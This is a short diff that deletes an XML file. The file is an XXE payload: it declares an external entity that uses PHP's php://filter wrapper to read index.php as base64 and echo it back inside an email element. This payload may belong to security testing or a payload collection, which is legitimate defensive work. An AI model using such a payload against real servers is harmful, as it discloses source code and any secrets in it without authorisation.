@@ -1,8 +1,0 @@
-<?xml version="1.0"?>
-<!DOCTYPE email [
-<!ELEMENT r ANY >
-<!ENTITY leak SYSTEM "php://filter/convert.base64-encode/resource=index.php">
-]>
-<email>
-<r>&leak;</r>
-</email>
